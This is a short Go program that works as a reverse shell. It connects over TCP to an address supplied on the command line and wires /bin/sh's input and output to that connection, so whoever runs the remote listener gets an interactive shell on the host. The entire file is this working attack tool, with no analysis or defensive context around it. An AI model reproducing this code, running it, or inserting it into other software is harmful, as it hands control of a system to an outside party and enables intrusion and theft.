package main

import (
	"fmt"
	"log"
	"os"
	"net"
	"os/exec"
)

func main(){
	remoteHandler()

}
// shell to make use of 
var shell = "/bin/sh"

func remoteHandler(){
	if len(os.Args) < 2 {
		log.Fatal("you didn't provide an argument\n")
		fmt.Println("example: " + os.Args[0] + "1.1.1.1:8888")
		os.Exit(1)
	}

	// connecting to the remote listener 
	con , err := net.Dial("tcp", os.Args[1])
	if err != nil {
		log.Fatal("error connecting ", err )
	}

	log.Println("connection established successfully ")

	command := exec.Command(shell)
	command.Stdin = con 
	command.Stdout = con 
	command.Stderr = con 
	command.Run()

}